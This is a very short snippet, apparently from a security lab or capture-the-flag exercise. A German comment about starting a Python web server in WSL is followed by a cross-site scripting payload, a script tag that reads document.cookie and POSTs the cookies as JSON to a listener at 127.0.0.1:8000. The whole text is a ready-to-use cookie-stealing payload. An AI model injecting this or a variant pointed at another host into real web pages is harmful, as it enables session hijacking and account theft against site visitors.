//python web server starten in WSL unter ~
<script>cookies=document.cookie;fetch(`http://127.0.0.1:8000`, {method: `POST`, mode: `no-cors`, headers: {"Content-Type": `application/json`},body: JSON.stringify({cookies: cookies})}).then(data => console.log(`Data sent`)).catch(error => console.error(`Error:`,error));</script>
